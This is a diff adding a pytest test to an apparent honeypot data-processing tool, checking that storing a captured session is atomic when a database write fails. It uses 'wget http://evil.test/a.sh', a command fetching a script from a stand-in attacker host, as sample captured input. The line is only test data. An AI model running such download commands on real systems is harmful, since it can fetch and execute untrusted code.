@@ -74,6 +74,25 @@ def test_process_new_session_stores_urls_and_relations(db, config):
     assert db.execute("SELECT honeynet FROM observations").fetchone() == ("CESNET Hugo",)
 
 
+def test_process_new_session_is_atomic(db, config, monkeypatch):
+    # a failure after the session row was written must not leave it behind
+    # without its url_session links (db_cleaner would delete it as an orphan)
+    execute = db.execute
+
+    def failing_execute(query, params=None):
+        if "url_source" in query:
+            raise RuntimeError("simulated failure")
+        return execute(query, params)
+
+    monkeypatch.setattr(db, "execute", failing_execute)
+    with pytest.raises(RuntimeError):
+        process_new_session(db, config, "wget http://evil.test/a.sh", None, "2026-01-01T10:00:00Z", "Warden", None)
+    monkeypatch.undo()
+
+    for table in ("sessions", "urls", "url_session"):
+        assert db.execute(f"SELECT COUNT(*) FROM {table}").fetchone()[0] == 0, table
+
+
 @pytest.mark.xfail(strict=True, reason="BUG: process_new_session() uses cursor.lastrowid after an UPSERT; "
                    "on conflict SQLite keeps the rowid of the previous insert, so known URLs are reported as new")
 def test_process_new_session_same_url_again_is_not_new(db, config):
